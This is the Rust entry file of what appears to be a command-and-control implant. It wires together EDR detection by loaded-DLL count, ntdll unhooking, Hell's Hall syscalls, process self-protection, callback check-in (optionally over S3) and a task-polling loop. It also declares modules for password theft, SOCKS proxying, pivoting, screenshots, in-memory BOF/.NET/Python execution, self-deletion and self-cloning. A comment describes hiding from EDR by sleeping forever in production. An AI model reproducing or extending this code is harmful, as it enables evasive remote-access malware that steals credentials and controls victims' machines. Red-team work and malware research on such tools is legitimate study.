mod config;
mod checkin;
mod transport;
mod s3_transport;
mod crypto;
mod tasking;
mod features {
    pub mod exit;
    pub mod pong;
    pub mod filesystem;
    pub mod upload;
    pub mod download;
    pub mod psw;
    pub mod socks;
    pub mod executeBOF;
    pub mod executeDOT;
    pub mod executePY;
    pub mod list_processes;
    pub mod pivot;
    pub mod screenshot;
    pub mod selfdelete;
    pub mod selfclone;
}
mod hellshall;
mod selfprotect;
mod worker;
mod helpers;
mod edrcheck;
mod unhook;

use std::{thread, time::Duration};

fn main() {
    // Worker subprocess mode — run payload and exit without any agent init.
    let args: Vec<String> = std::env::args().collect();
    if args.len() >= 2 {
        match args[1].as_str() {
            "--worker-bof" => {
                worker::run_bof_worker();
                return;
            }
            "--worker-dot" => {
                worker::run_dot_worker();
                return;
            }
            "--worker-py" => {
                worker::run_py_worker();
                return;
            }
            _ => {}
        }
    }

    // === EDR CHECK: count loaded DLLs ===
    let dll_count = unsafe { edrcheck::count_loaded_modules() };
    if dll_count > config::MAX_LOADED_DLLS {
        eprintln!("[!] EDR detected: {} DLLs loaded (threshold: {})", dll_count, config::MAX_LOADED_DLLS);
        // TODO: in production, enter infinite sleep instead:
        // loop { std::thread::sleep(std::time::Duration::from_secs(u64::MAX)); }
    } else {
        eprintln!("[+] DLL count OK: {} (threshold: {})", dll_count, config::MAX_LOADED_DLLS);
    }

    // === NTDLL UNHOOKING ===
    unsafe {
        unhook::unhook_ntdll();
    }

    selfprotect::set_process_security_descriptor();

    println!("URL: {}", config::callback_host);

    // S3 bootstrap registration (get per-execution IAM credentials)
    if config::use_s3 {
        loop {
            match s3_transport::register() {
                Ok(_) => break,
                Err(e) => {
                    eprintln!("[REG] Registration failed: {}, retrying...", e);
                    helpers::sleep_with_jitter();
                }
            }
        }
    }

    checkin::checkin();

    loop {
        if let Err(e) = tasking::getTasking() {
            eprintln!("Tasking error: {}", e);
        }
        helpers::sleep_with_jitter();
    }
}
